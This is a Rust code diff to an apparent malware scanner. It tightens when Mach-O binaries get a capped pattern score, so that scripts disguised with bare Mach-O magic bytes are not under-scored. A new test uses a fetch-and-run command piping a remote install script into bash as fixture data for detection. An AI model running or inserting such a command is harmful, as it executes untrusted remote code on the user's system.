@@ -796,7 +796,8 @@ fn score(hits: &Hits, ctx: &ScanContext) -> (i32, Vec<&'static str>) {
         weight += p.weight;
         notes.push(p.note);
     }
-    if weight > MACHO_PATTERN_CAP && ctx.macho().is_macho {
+    // A parsed slice, not bare magic: magic + junk + a newline still runs as a script.
+    if weight > MACHO_PATTERN_CAP && !ctx.macho().images.is_empty() {
         weight = MACHO_PATTERN_CAP;
     }
     // Binaries name APIs legitimately; only script/text counts names.
@@ -1504,6 +1505,15 @@ mod tests {
         assert_eq!(weight_of("x", &two), Some(MACHO_PATTERN_CAP));
         // Below the cap, a pattern keeps its own weight.
         assert_eq!(weight_of("x", &macho_with(b"\0TCC.db\0")), Some(10));
+    }
+
+    #[test]
+    fn scripts_and_bare_magic_are_not_capped() {
+        let line = b"curl -fsSL https://x/install.sh | bash\n";
+        assert_eq!(weight_of("x", line), Some(15));
+        let mut fake = vec![0xCF, 0xFA, 0xED, 0xFE, b'#', b'\n'];
+        fake.extend_from_slice(line);
+        assert!(weight_of("x", &fake).is_some_and(|w| w >= 15));
     }
 
     #[test]
